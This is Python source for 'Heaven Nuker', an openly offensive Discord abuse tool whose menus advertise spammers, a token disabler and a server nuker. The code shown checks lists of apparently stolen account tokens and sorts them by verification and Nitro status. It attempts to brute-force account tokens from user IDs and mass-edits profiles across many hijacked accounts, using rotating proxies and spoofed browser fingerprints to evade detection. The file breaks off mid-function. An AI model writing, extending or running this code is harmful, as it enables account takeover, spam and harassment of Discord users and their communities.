import ctypes
import json
import time
import random
import string
import os
import getpass
import sys
import base64
import concurrent.futures
import logging

try:
    import requests
    import colored
    import pystyle
    import datetime
    import keyboard
    import tkinter
    import tls_client
    import threading
    import easygui
    import colorama
    import pynput
    import websocket
    import fake_useragent
    import httpx
    import emoji as emojizer
    import bs4
    import discum
    import discord
except ModuleNotFoundError:
    os.system('pip install requests')
    os.system('pip install colored')
    os.system('pip install pystyle')
    os.system('pip install datetime')
    os.system('pip install keyboard')
    os.system('pip install tkinter')
    os.system('pip install tls_client')
    os.system('pip install threading')
    os.system('pip install easygui')
    os.system('pip install colorama')
    os.system('pip install pynput')
    os.system('pip install websocket')
    os.system('pip install fake_useragent')
    os.system('pip install httpx')
    os.system('pip install emoji')
    os.system('pip install bs4')
    os.system('pip install discum==1.1.0')
    os.system('pip install discord')

from bs4 import BeautifulSoup
from colorama import Fore, Style
from random import choice
from data.solver import Solver
from data.plugins import *
from websocket import WebSocket
from tls_client import Session
from pystyle import Write, System, Colors, Colorate, Anime
from colored import fg
from json import dumps
from pynput import keyboard as ks
from concurrent.futures import ThreadPoolExecutor
from os.path import isfile, join
from discord.ext import commands

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT

owners = "Waltuh"
toolname = "Heaven Nuker"
date = datetime.datetime.now()
date_now = date.strftime("%d/%m/%Y")
chrome_version = "116"
xsup = "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVzIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTYuMC4xOTM4LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTE2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjIyNTg3MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="

with open("config.json") as f:
    data = json.load(f)
    check = data.get("auto_proxy_scraper")
    if check == "y":
        def save_proxies(proxies):
            with open("proxies.txt", "w") as file:
                file.write("\n".join(proxies))

        def get_proxies():
            with open('proxies.txt', 'r', encoding='utf-8') as f:
                proxies = f.read().splitlines()
            if not proxies:
                proxy_log = {}
            else:
                proxy = random.choice(proxies)
                proxy_log = {
                    "http://": f"http://{proxy}", "https://": f"http://{proxy}"
                }
            try:
                url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"
                response = httpx.get(url, proxies=proxy_log, timeout=60)

                if response.status_code == 200:
                    proxies = response.text.splitlines()
                    save_proxies(proxies)
                else:
                    time.sleep(1)
                    get_proxies()
            except httpx.ProxyError:
                get_proxies()
            except httpx.ReadError:
                get_proxies()
            except httpx.ConnectTimeout:
                get_proxies()
            except httpx.ReadTimeout:
                get_proxies()
            except httpx.ConnectError:
                get_proxies()
            except httpx.ProtocolError:
                get_proxies()
            
        def check_proxies_file():
            file_path = "proxies.txt"
            if os.path.exists(file_path) and os.path.getsize(file_path) == 0:
                get_proxies()
    
        check_proxies_file()
    else:
        pass

def get_nonce():
    date = datetime.datetime.now()
    unixts = time.mktime(date.timetuple())
    return str((int(unixts)*1000-1420070400000)*4194304)

def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

def random2(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text

def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text

def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

def get_random_proxy():
    with open("proxies.txt", "r") as f:
        proxies = f.readlines()
    if len(proxies) != 0:
        proxy = random.choice(proxies).strip()
        return proxy
    else:
        return None

session = tls_client.Session(
    client_identifier="chrome_116",
)

proxy_lines = open("proxies.txt", "r").readlines()
proxies = random.choice(proxy_lines).strip() if proxy_lines else None

if proxies and (":" in proxies):
    proxy = "http://" + proxies
else:
    proxy = None

if proxy:
    session.proxies = {
        "http": proxy,
        "https": proxy
    }
else:
    session_class = tls_client.Session
    kwargs = {}

    session = session_class(
        client_identifier="chrome_116",
    )

def radu_tool2():
    username = getpass.getuser()
    System.Clear()
    tokens = len(open('tokens.txt').readlines())
    ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Tokens : {tokens} | https://github.com/waltuhium69')
    Write.Print(f"""
\t\t                     ██╗  ██╗███████╗ █████╗ ██╗   ██╗███████╗███╗   ██╗
\t\t                     ██║  ██║██╔════╝██╔══██╗██║   ██║██╔════╝████╗  ██║
\t\t                     ███████║█████╗  ███████║██║   ██║█████╗  ██╔██╗ ██║
\t\t                     ██╔══██║██╔══╝  ██╔══██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║
\t\t                     ██║  ██║███████╗██║  ██║ ╚████╔╝ ███████╗██║ ╚████║
\t\t                     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝  
                                          Welcome {username} | https://t.me/waltuhium  
                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                        ( ! ) Send Suggestion           |           ( + ) Check Update  
                                                ( $ ) Paid Menu  
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
        \t(30) Bio Changer
        \t(31) Voice Spammer
        \t(32) Pronoun Changer
        \t(33) Friend RQ Link Gen
        \t(34) Bot Server Nuker
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════""", Colors.purple_to_blue, interval=0.0000)
    Write.Print(f"\nroot@heavennuker ~> ", Colors.purple_to_blue, interval=0.000); opc = input(magenta).lower()
    if opc=="x" or opc=="exit" or opc=="esc":
        System.Clear()
        bye_bye(username, date_now)
    if opc=="$":
        Write.Print(f"""
[!] This version is the free version of Heaven Nuker. To access the Paid Menu, please contact the creator (Waltuh). \nIf you encounter any issues, you can reach us through our servers or via telegram.

Telegram : https://t.me/waltuhium
Github : github.com/waltuhium69\n\nroot@press_enter ~> """, Colors.purple_to_red, interval=0.000); input()
        radu_tool2()
    if opc=="+":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Update System')
        def update_system():
            def updater():
                    response = requests.get('https://pastebin.com/raw/fGvGVaZn')
                    lines = response.text.split('\n')
                    found = False
                    for line in lines:
                        words = line.split()
                        for word in words:
                            if word.startswith('https://www.mediafire.com/'):
                                found = True
                                break
                    if found:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Found Update {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(f"Download ~> https://github.com/waltuhium69" + "\n", Colors.purple_to_red, interval=0.000)
                        Write.Print(f"\nDo you want to update? y/n ~> ", Colors.purple_to_blue, interval=0.000); y_or_n = input(magenta).lower()
                        if y_or_n=="y":
                            def download():
                                response = requests.get('https://pastebin.com/raw/fGvGVaZn')
                                lines = response.text.split('\n')
                                for line in lines:
                                    url = line
                                    name_folder = 'RaduTool.zip'
                                    response = requests.get(url)
                                    if response.status_code == 200:
                                        soup = BeautifulSoup(response.content, 'html.parser')
                                        download_link = soup.find('a', {'class': 'input'})
                                        
                                        if download_link is not None:
                                            download_url = download_link['href']
                                            response = requests.get(download_url)

                                            if response.status_code == 200:
                                                with open(name_folder, 'wb') as f:
                                                    f.write(response.content)
                                                time_rn = get_time_rn()
                                                print(f"\n{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Successfully Downloaded Latest Update")
                                                Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                                                radu_tool2()
                                            else:
                                                time_rn = get_time_rn()
                                                print(f"\n{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed To Download")
                                                Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                                                radu_tool2()
                                        else:
                                            time_rn = get_time_rn()
                                            print(f"\n{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Download Not Found!")
                                            Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                                            radu_tool2()
                                    else:
                                        time_rn = get_time_rn()
                                        print(f"\n{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Error Downloading")
                                        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                                        radu_tool2()
                            download()
                        if y_or_n=="n":
                            update_system()
                    else:
                        time_rn = get_time_rn()
                        print(f"\n{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}~{gray}) {pretty}Update Not Found!")
                        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                        radu_tool2()
            updater()
        update_system()
    if opc=="!":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Send Suggestion')
        open('data\send_suggest.py')
        os.system("data\send_suggest.py")
        radu_tool2()
    if opc=="<" or opc=="<<":
        radu_tool()
    if opc=="30":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Bio Changer')
        Write.Print(f"\nroot@bio ~> ", Colors.purple_to_red, interval=0.000); bio = input()
        if bio == "" or bio == None:
            bio = ".gg/radutool"
        else:
            bio = bio

        output_lock = threading.Lock()
        def bio_changer(token):
            payload = {
                "bio": bio
            }

            headers = {
                'authorization': token,
                "accept": "*/*",
                "accept-language": "en-GB",
                "content-length": str(len(dumps(payload))),
                "content-type": "application/json",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": xsup
            }

            r = session.patch(f"https://discord.com/api/v9/users/@me/profile", headers=headers, json=payload)
            with output_lock:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Changed Bio {gray}| ", end='')
                sys.stdout.flush()
                Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)

        def process_token(token):
            bio_changer(token)

        def main():
            with open("tokens.txt", "r", encoding='utf-8') as f:
                tokens = f.read().splitlines()

            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(process_token, tokens)
        
        main()
        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        radu_tool2()
    if opc=="31":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Voice Spammer')
        Write.Print(f"\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium ", Colors.red, interval=0.000); server_id = input()

        
    if opc=="32":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Pronoun Changer')
        Write.Print(f"\nroot@pronoun ~> ", Colors.purple_to_red, interval=0.000); pronouns = input()
        if pronouns == "" or pronouns == None:
            pronouns = "https://t.me/waltuhium"
        else:
            pronouns = pronouns

        output_lock = threading.Lock()
        def pronoun_changer(token):
            payload = {
                "pronouns": pronouns
            }

            headers = {
                'authorization': token,
                "accept": "*/*",
                "accept-language": "en-GB",
                "content-length": str(len(dumps(payload))),
                "content-type": "application/json",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": xsup
            }

            r = session.patch(f"https://discord.com/api/v9/users/@me/profile", headers=headers, json=payload)
            with output_lock:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Added Pronoun {gray}| ", end='')
                sys.stdout.flush()
                Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)

        def process_token(token):
            pronoun_changer(token)

        def main():
            with open("tokens.txt", "r", encoding='utf-8') as f:
                tokens = f.read().splitlines()

            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(process_token, tokens)
        
        main()
        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        radu_tool2()
    if opc=="33":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Friend RQ Link Gen')
        output_lock = threading.Lock()
        print()
        def gen_frlink(token):
            headers = {
                "authorization": token,
                "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
            }

            r = session.post(f"https://discord.com/api/v9/users/@me/invites", headers=headers)
            if r.status_code == 200:
                invite_code = r.json()['code']
                with output_lock:
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Created Friend RQ Invite {gray}| ", end='')
                    sys.stdout.flush()
                    Write.Print("discord.gg/" + invite_code + "\n", Colors.purple_to_red, interval=0.000)
            else:
                pass

        def process_token(token):
            gen_frlink(token)

        def main():
            with open("tokens.txt", "r", encoding='utf-8') as f:
                tokens = f.read().splitlines()

            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(process_token, tokens)
        
        main()
        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        radu_tool2()
    if opc=="34":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Bot Server Nuker')
        Write.Print(f"\nThis option is for the paid version of Heaven Nuker if you want to buy it: https://t.me/waltuhium ", Colors.red, interval=0.000); bot_token = input()
        
    else:
        radu_tool2()

def radu_tool():
    username = getpass.getuser()
    System.Clear()
    tokens = len(open('tokens.txt').readlines())
    ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Tokens : {tokens} | https://github.com/waltuhium69')
    Write.Print(f"""
\t\t                     ██╗  ██╗███████╗ █████╗ ██╗   ██╗███████╗███╗   ██╗
\t\t                     ██║  ██║██╔════╝██╔══██╗██║   ██║██╔════╝████╗  ██║
\t\t                     ███████║█████╗  ███████║██║   ██║█████╗  ██╔██╗ ██║
\t\t                     ██╔══██║██╔══╝  ██╔══██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║
\t\t                     ██║  ██║███████╗██║  ██║ ╚████╔╝ ███████╗██║ ╚████║
\t\t                     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   
                                          Welcome {username} | https://t.me/waltuhium  
                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                        ( ! ) Send Suggestion           |           ( + ) Check Update  
                                                ( $ ) Paid Menu
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
        \t(1) Token Checker\t\t(11) Voice Joiner\t\t(21) GroupDM Spammer
        \t(2) Token Bruteforce\t\t(12) Thread Spammer\t\t(22) Hypesquad Joiner
        \t(3) Webhook Deleter\t\t(13) Token Onliner\t\t(23) Pin Message Spammer
        \t(4) Webhook Spammer\t\t(14) Nickname Changer\t\t(24) DM Deleter
        \t(5) Member Booster\t\t(15) Channel Spammer\t\t(25) Token Information
        \t(6) DM Spammer\t\t\t(16) Reply Spammer\t\t(26) Audit Bomber
        \t(7) Token Disabler\t\t(17) Webhook Creator\t\t(27) Member ID Scraper
        \t(8) Forum Flooder\t\t(18) Reaction Spammer\t\t(28) DM Opener
        \t(9) Fake Typing\t\t\t(19) Server Nuker Menu\t\t(29) Message Cleaner   
        \t(10) Friend Spammer\t\t(20) Server Leaver\t\t(""", Colors.purple_to_blue, interval=0.0000); print(pretty + f">>", end=''); Write.Print(f") Next Page\n", Colors.white, interval=0.000)
    Write.Print(f"""════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════""", Colors.purple_to_blue, interval=0.0000)
    Write.Print(f"\nroot@heavennuker ~> ", Colors.purple_to_blue, interval=0.000); opc = input(magenta).lower()
    if opc=="x" or opc=="exit" or opc=="esc":
        System.Clear()
        bye_bye(username, date_now)
    if opc=="$":
        Write.Print(f"""
[!] This version is the free version of Heaven Nuker. To access the Paid Menu, please contact the creator (Waltuh). \nIf you encounter any issues, you can reach us through our servers or via email.

Telegram : https://t.me/waltuhium
Github : github.com/waltuhium69\n\nroot@press_enter ~> """, Colors.purple_to_red, interval=0.000); input()
        radu_tool()
    if opc=="+":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Update System')
        def update_system():
            def updater():
                    response = requests.get('https://pastebin.com/raw/fGvGVaZn')
                    lines = response.text.split('\n')
                    found = False
                    for line in lines:
                        words = line.split()
                        for word in words:
                            if word.startswith('https://www.mediafire.com/'):
                                found = True
                                break
                    if found:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Found Update {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(f"Download ~> https://github.com/waltuhium69" + "\n", Colors.purple_to_red, interval=0.000)
                        Write.Print(f"\nDo you want to update? y/n ~> ", Colors.purple_to_blue, interval=0.000); y_or_n = input(magenta).lower()
                        if y_or_n=="y":
                            def download():
                                response = requests.get('https://pastebin.com/raw/fGvGVaZn')
                                lines = response.text.split('\n')
                                for line in lines:
                                    url = line
                                    name_folder = 'RaduTool.zip'
                                    response = requests.get(url)
                                    if response.status_code == 200:
                                        soup = BeautifulSoup(response.content, 'html.parser')
                                        download_link = soup.find('a', {'class': 'input'})
                                        
                                        if download_link is not None:
                                            download_url = download_link['href']
                                            response = requests.get(download_url)

                                            if response.status_code == 200:
                                                with open(name_folder, 'wb') as f:
                                                    f.write(response.content)
                                                time_rn = get_time_rn()
                                                print(f"\n{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Successfully Downloaded Latest Update")
                                                Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                                                radu_tool()
                                            else:
                                                time_rn = get_time_rn()
                                                print(f"\n{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed To Download")
                                                Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                                                radu_tool()
                                        else:
                                            time_rn = get_time_rn()
                                            print(f"\n{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Download Not Found!")
                                            Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                                            radu_tool()
                                    else:
                                        time_rn = get_time_rn()
                                        print(f"\n{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Error Downloading")
                                        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                                        radu_tool()
                            download()
                        if y_or_n=="n":
                            update_system()
                    else:
                        time_rn = get_time_rn()
                        print(f"\n{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}~{gray}) {pretty}Update Not Found!")
                        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                        radu_tool()
            updater()
        update_system()
    if opc=="!":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Send Suggestion')
        open('data\send_suggest.py')
        os.system("data\send_suggest.py")
        radu_tool()
    if opc=="1":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Token Checker')
        print()
        valid = 0
        invalid = 0
        phone_verify = 0
        email_verify = 0
        nitro = 0
        with open('tokens.txt', 'r') as f:
            tokens = f.read().splitlines()
        
        valid_tokens = []
        email_tokens = []
        phone_tokens = []
        invalid_tokens = []
        nitro_tokens_good = []

        for token in tokens:
            headers = {
            'Authorization': token
            }
            response = requests.get('https://discord.com/api/v9/users/@me/burst-credits', headers=headers)
            if response.status_code == 200:
                user_data = json.loads(response.text)
                if 'phone' in user_data and user_data['phone'] is not None:
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({yellow}/{gray}) {pretty}Phone Unverified {gray}| {pink}", end='')
                    sys.stdout.flush()
                    Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                    phone_tokens.append(token)
                    phone_verify += 1
                elif 'email' in user_data and user_data['email'] is not None:
                    if ('verified' in user_data and user_data['verified']) or ('phone_verified' in user_data and user_data['phone_verified']):
                        if 'nitro' in user_data and user_data['nitro']:
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Fully Verified & Nitro {gray}| ", end='')
                            sys.stdout.flush()
                            Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                            nitro_tokens_good.append(token)
                            nitro += 1
                        else:
                            if 'phone_verified' in user_data and not user_data['phone_verified']:
                                time_rn = get_time_rn()
                                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({yellow}/{gray}) {pretty}Phone Unverified {gray}| ", end='')
                                sys.stdout.flush()
                                Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                                phone_tokens.append(token)
                                phone_verify += 1
                            else:
                                time_rn = get_time_rn()
                                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}| ", end='')
                                sys.stdout.flush()
                                Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                                valid_tokens.append(token)
                                valid += 1
                    else:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({yellow}/{gray}) {pretty}Email Unverified {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        email_tokens.append(token)
                        email_verify += 1
                else:
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}| ", end='')
                    sys.stdout.flush()
                    Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                    valid_tokens.append(token)
                    valid += 1
            elif response.status_code == 401:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}| ", end='')
                sys.stdout.flush()
                Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                invalid_tokens.append(token)
                invalid += 1
            else:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}| ", end='')
                sys.stdout.flush()
                Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                invalid_tokens.append(token)
                invalid += 1
        total_checked = valid + invalid + email_verify + nitro + phone_verify
        Write.Print(f"""\n\n
                                    ╔═════════════════════════════════════════╗
                                    ║   HEAVEN NUKER TOKEN CHECKER STATS  ║
                                ╔═════════════════════════════════════════════════╗
                                        \t   Total Checked : {total_checked}     
                                        \t   Valid : {valid}     
                                        \t   Email Unverified : {email_verify}  
                                        \t   Phone Unverified : {phone_verify}
                                        \t   Invalid Tokens : {invalid}
                                        \t   Nitro Tokens : {nitro}      
                                ╚═════════════════════════════════════════════════╝                                
    """, Colors.purple_to_red, interval=0.000)
        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
        with open('tokens.txt', 'w') as f:
                f.write("")
        with open('tokens.txt', 'w') as f:
            if not valid_tokens:
                f.write("[ VALID TOKENS ]\n\n")
                f.write("[ No Valid Tokens Found ]")
            else:                           
                f.write("[ VALID TOKENS ]\n\n")
                for token in valid_tokens:
                    f.write(token + '\n')
        with open('tokens.txt', 'a') as f:                                                             
            if not email_tokens:
                f.write("\n[ EMAIL UNVERIFIED TOKENS ]\n\n")
                f.write("[ No Email Unverified Tokens Found ]")                            
            else:
                f.write("\n[ EMAIL UNVERIFIED TOKENS ]\n\n")
                for token in email_tokens:
                    f.write(token + '\n')                               
        with open('tokens.txt', 'a') as f:
            if not phone_tokens:
                f.write("\n[ PHONE UNVERIFIED TOKENS ]\n\n")
                f.write("[ No Phone Unverified Tokens Found ]")                              
            else:
                f.write("\n[ PHONE UNVERIFIED TOKENS ]\n\n")
                for token in phone_tokens:
                    f.write(token + '\n')
        radu_tool()
    if opc=="2":
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname} - Made By {owners} - Date : {date_now} - Logged As : {username} | Module : Token Bruteforce')
        Write.Print(f"\nUser ID ~> ", Colors.purple_to_red, interval=0.000); id = base64.b64encode(input().encode("ascii"))
        output_lock = threading.Lock()
        id_to_token = str(id)[2:-1].replace("=", "")
        time_rn = get_time_rn()
        print(f"\n{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}*{gray}) {pretty}Scraped Half Token {gray}| ", end='')
        sys.stdout.flush()
        Write.Print(id_to_token + "\n", Colors.purple_to_red, interval=0.000)
        time.sleep(2.5)
        def bruteforce():
                time_rn = get_time_rn()
                if id_to_token.startswith('MTA') or id_to_token.startswith('MTE') or id_to_token.startswith('MTz'):
                    characters = string.ascii_letters + string.digits
                    first = ''.join(random.choices(characters, k=6))
                    characters2 = string.ascii_letters + string.digits
                    length = random.randint(39, 42)
                    second = ''.join(random.choices(characters2, k=length))
                    brute_token = id_to_token + "." + first + "." + second
                    token = brute_token.replace("=", "")
                    headers = {
                        'Authorization': token
                    }
                    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                    if login.status_code == 200:
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Bruteforced {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        folder = "Results"
                        if not os.path.exists(folder):
                            os.makedirs(folder)
                        with open(f"Results/token_bruteforced.txt", "w") as bruted:
                            bruted.write(token + "\n")
                        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                        radu_tool()
                    else:
                        with output_lock:
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}| ", end='')
                            sys.stdout.flush()
                            Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                elif id_to_token.startswith('O' or 'N' or 'Z' or 'OTZ' or 'NT' or 'NTZ' or 'OTk' or 'OTz'):
                    characters = string.ascii_letters + string.digits
                    first = ''.join(random.choices(characters, k=4))
                    characters2 = string.ascii_letters + string.digits
                    second = ''.join(random.choices(characters2, k=25))
                    brute_token = id_to_token + "." + first + "." + second
                    token = brute_token.replace("=", "")
                    headers = {
                        'Authorization': token
                        }
                    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                    if login.status_code == 200:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Bruteforced {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        folder = "Results"
                        if not os.path.exists(folder):
                            os.makedirs(folder)
                        with open(f"Results/token_bruteforced.txt", "w") as bruted:
                            bruted.write(token + "\n")
                        Write.Print(f"\nroot@press_enter ~> ", Colors.purple_to_red, interval=0.000); input()
                        radu_tool()
                    else:
                        with output_lock:
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}| ", end='')
